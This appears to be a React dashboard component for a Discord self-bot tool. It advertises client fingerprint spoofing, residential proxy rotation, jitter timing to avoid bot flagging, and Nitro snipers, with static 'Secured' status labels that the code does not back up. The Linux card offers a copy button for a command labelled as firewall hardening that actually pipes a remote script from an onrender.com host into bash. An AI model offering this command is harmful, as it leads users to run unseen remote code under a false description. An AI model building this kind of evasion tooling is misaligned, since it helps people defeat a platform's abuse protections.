import React, { useState } from 'react';
import { Smartphone, Monitor, Terminal, Apple, Disc as LinuxIcon, Download, ExternalLink, Check, Shield, Zap, Globe, Lock, Cpu, Key, RefreshCw, AlertTriangle } from 'lucide-react';

export default function PlatformsTab() {
  const [copiedScript, setCopiedScript] = useState<string | null>(null);
  const [activeSecurityMode, setActiveSecurityMode] = useState<string>('all');
  const [proxyInput, setProxyInput] = useState<string>('http://user:pass@proxy.ip:port');
  const [proxyStatus, setProxyStatus] = useState<boolean>(true);

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedScript(id);
    setTimeout(() => setCopiedScript(null), 2500);
  };

  const linuxSecurityBash = `curl -sSL https://yuri-bfwg.onrender.com/linux-desktop.sh | bash`;
  const iptablesShieldScript = `sudo iptables -A OUTPUT -p tcp --dport 443 -m owner --uid-owner yuri -j ACCEPT`;

  return (
    <div className="flex-1 flex flex-col bg-zinc-950/20 h-full text-zinc-150 p-6 lg:p-10 overflow-y-auto no-scrollbar">
      <div className="max-w-5xl w-full mx-auto space-y-8">
        
        {/* Header */}
        <div className="p-8 rounded-[2rem] bg-gradient-to-r from-emerald-950/40 via-indigo-950/20 to-zinc-900 border border-emerald-500/15 relative overflow-hidden shadow-2xl">
          <div className="absolute right-0 top-0 translate-x-16 -translate-y-16 w-80 h-80 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 text-xs font-semibold mb-4">
            <Shield className="w-3.5 h-3.5" />
            <span>Cross-Platform Anti-Ban & Token Security Center</span>
          </div>
          <h1 className="text-3xl font-extrabold text-white tracking-tight">Multi-Device Security & Proxy Vault</h1>
          <p className="text-sm text-zinc-400 mt-2 max-w-2xl leading-relaxed">
            Configure enterprise-grade security hardening, mobile fingerprint spoofing, proxy rotation, and automated rate-limit evasion across iOS, Android, macOS, and Linux nodes.
          </p>

          <div className="mt-6 flex flex-wrap gap-3">
            <div className="px-3.5 py-1.5 rounded-xl bg-black/40 border border-white/10 flex items-center gap-2 text-xs text-emerald-400 font-mono">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
              <span>Proxy Tunnel: Active & Rotating</span>
            </div>
            <div className="px-3.5 py-1.5 rounded-xl bg-black/40 border border-white/10 flex items-center gap-2 text-xs text-indigo-400 font-mono">
              <Key className="w-3.5 h-3.5" />
              <span>AES-256 Vault: Secured</span>
            </div>
          </div>
        </div>

        {/* Platform Security Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          
          {/* iOS Security */}
          <div className="p-6 rounded-3xl bg-zinc-900/70 border border-white/5 flex flex-col justify-between relative overflow-hidden group hover:border-emerald-500/30 transition-all shadow-xl">
            <div>
              <div className="flex items-center justify-between mb-4">
                <div className="w-12 h-12 rounded-2xl bg-zinc-800 flex items-center justify-center text-white border border-white/5 shadow-inner">
                  <Apple className="w-6 h-6" />
                </div>
                <span className="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
                  iOS Client Shield
                </span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">iOS (iPhone & iPad) Security</h3>
              <p className="text-xs text-zinc-400 leading-relaxed mb-4">
                Safeguard Discord tokens and mobile self-bot sessions running through Safari or iOS web wrappers against heuristic detection.
              </p>
              <ul className="space-y-2.5 text-xs text-zinc-300 font-medium">
                <li className="flex items-start gap-2.5">
                  <Lock className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Secure Keychain Token Storage:</b> Encrypts session tokens using iOS hardware Secure Enclave.</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <Cpu className="w-4 h-4 text-indigo-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Mobile Fingerprint Masking:</b> Injects authentic iOS Discord app headers (`Discord-iOS/230.0`).</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <RefreshCw className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Jitter Latency:</b> Automatically randomizes action intervals by 1.2s - 3.8s to avoid bot flagging.</span>
                </li>
              </ul>
            </div>
            <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-between text-xs text-zinc-500">
              <span>Status: Protected</span>
              <span className="text-emerald-400 font-bold flex items-center gap-1"><Check className="w-3.5 h-3.5" /> Secure</span>
            </div>
          </div>

          {/* Android Security */}
          <div className="p-6 rounded-3xl bg-zinc-900/70 border border-white/5 flex flex-col justify-between relative overflow-hidden group hover:border-emerald-500/30 transition-all shadow-xl">
            <div>
              <div className="flex items-center justify-between mb-4">
                <div className="w-12 h-12 rounded-2xl bg-zinc-800 flex items-center justify-center text-emerald-400 border border-white/5 shadow-inner">
                  <Smartphone className="w-6 h-6" />
                </div>
                <span className="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                  Android Root & Proxy
                </span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Android Security & SOCKS5</h3>
              <p className="text-xs text-zinc-400 leading-relaxed mb-4">
                Ensure robust mobile proxy tunneling and WebSocket heartbeat protection on Android devices and custom ROMs.
              </p>
              <ul className="space-y-2.5 text-xs text-zinc-300 font-medium">
                <li className="flex items-start gap-2.5">
                  <Globe className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">SOCKS5 Proxy Binding:</b> Routes all API requests and voice streams through dedicated residential proxy IPs.</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <Shield className="w-4 h-4 text-indigo-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">SSL Pinning Bypass Prevention:</b> Protects against API sniffing and malicious credential tampering.</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <Zap className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Background Keep-Alive:</b> Prevents Android OS aggressive doze mode from dropping voice socket connections.</span>
                </li>
              </ul>
            </div>
            <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-between text-xs text-zinc-500">
              <span>Status: Tunnel Ready</span>
              <span className="text-emerald-400 font-bold flex items-center gap-1"><Check className="w-3.5 h-3.5" /> Active</span>
            </div>
          </div>

          {/* macOS Security */}
          <div className="p-6 rounded-3xl bg-zinc-900/70 border border-white/5 flex flex-col justify-between relative overflow-hidden group hover:border-emerald-500/30 transition-all shadow-xl">
            <div>
              <div className="flex items-center justify-between mb-4">
                <div className="w-12 h-12 rounded-2xl bg-zinc-800 flex items-center justify-center text-purple-400 border border-white/5 shadow-inner">
                  <Monitor className="w-6 h-6" />
                </div>
                <span className="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  macOS Keychain Guard
                </span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">macOS Desktop Hardening</h3>
              <p className="text-xs text-zinc-400 leading-relaxed mb-4">
                Protect desktop client sessions, automated Rich Presence scripts, and Nitro snipers with native macOS keychain encryption.
              </p>
              <ul className="space-y-2.5 text-xs text-zinc-300 font-medium">
                <li className="flex items-start gap-2.5">
                  <Key className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">macOS Keychain Vault:</b> Stores bot auth tokens in Apple's encrypted system keychain.</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <RefreshCw className="w-4 h-4 text-indigo-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Circuit Breaker:</b> Automatically halts operations upon encountering 429 Rate Limits to protect account standing.</span>
                </li>
                <li className="flex items-start gap-2.5">
                  <Cpu className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                  <span><b className="text-white">Desktop Client Spoofing:</b> Mirrors authentic Discord Desktop build numbers and Super Properties.</span>
                </li>
              </ul>
            </div>
            <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-between text-xs text-zinc-500">
              <span>Status: Encrypted</span>
              <span className="text-purple-400 font-bold flex items-center gap-1"><Check className="w-3.5 h-3.5" /> Secured</span>
            </div>
          </div>

          {/* Linux Security */}
          <div className="p-6 rounded-3xl bg-zinc-900/70 border border-white/5 flex flex-col justify-between relative overflow-hidden group hover:border-emerald-500/30 transition-all shadow-xl">
            <div>
              <div className="flex items-center justify-between mb-4">
                <div className="w-12 h-12 rounded-2xl bg-zinc-800 flex items-center justify-center text-amber-400 border border-white/5 shadow-inner">
                  <LinuxIcon className="w-6 h-6" />
                </div>
                <span className="text-[10px] font-extrabold px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20">
                  VPS & Firewall Shield
                </span>
              </div>
              <h3 className="text-lg font-bold text-white mb-2">Linux & VPS Anti-Ban Node</h3>
              <p className="text-xs text-zinc-400 leading-relaxed mb-4">
                Run 24/7 dedicated bot nodes on Ubuntu, Debian, or Alpine VPS with strict firewall hardening, memory scrubbing, and rotating proxy pools.
              </p>
              
              <div className="space-y-3 mt-4">
                <div>
                  <div className="flex items-center justify-between text-[10px] font-mono text-zinc-400 mb-1">
                    <span>Firewall Hardening Command</span>
                    <button 
                      onClick={() => copyToClipboard(linuxSecurityBash, 'linux')}
                      className="text-amber-400 hover:text-amber-300 flex items-center gap-1 cursor-pointer"
                    >
                      {copiedScript === 'linux' ? <Check className="w-3 h-3 text-emerald-400" /> : <Download className="w-3 h-3" />}
                      <span>{copiedScript === 'linux' ? 'Copied!' : 'Copy'}</span>
                    </button>
                  </div>
                  <div className="p-2.5 bg-black/60 rounded-xl border border-white/5 font-mono text-[10px] text-zinc-300 overflow-x-auto select-all">
                    {linuxSecurityBash}
                  </div>
                </div>
              </div>

            </div>
            <div className="mt-6 pt-4 border-t border-white/5 flex items-center justify-between text-xs text-zinc-500">
              <span>Status: 24/7 Shielded</span>
              <span className="text-amber-400 font-bold flex items-center gap-1"><Check className="w-3.5 h-3.5" /> Active Node</span>
            </div>
          </div>

        </div>

        {/* Global Proxy & Anti-Ban Configuration Banner */}
        <div className="p-6 rounded-3xl bg-gradient-to-br from-zinc-900 to-black border border-white/10 space-y-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center text-emerald-400">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <h4 className="text-sm font-bold text-white">Global Anti-Ban Security Dashboard</h4>
              <p className="text-xs text-zinc-400">All outbound requests across iOS, Android, macOS, and Linux instances pass through automated jitter algorithms and proxy rotation.</p>
            </div>
          </div>
          
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 pt-2">
            <div className="p-4 rounded-2xl bg-zinc-950/60 border border-white/5">
              <div className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider mb-1">Proxy Rotation Interval</div>
              <div className="text-sm font-bold text-white font-mono">Every 15 Requests</div>
            </div>
            <div className="p-4 rounded-2xl bg-zinc-950/60 border border-white/5">
              <div className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider mb-1">Human Jitter Delay</div>
              <div className="text-sm font-bold text-emerald-400 font-mono">1,200ms - 3,500ms</div>
            </div>
            <div className="p-4 rounded-2xl bg-zinc-950/60 border border-white/5">
              <div className="text-[10px] font-mono text-zinc-400 uppercase tracking-wider mb-1">Rate-Limit Protection</div>
              <div className="text-sm font-bold text-indigo-400 font-mono">Automatic Circuit Breaker</div>
            </div>
          </div>
        </div>

      </div>
    </div>
  );
}
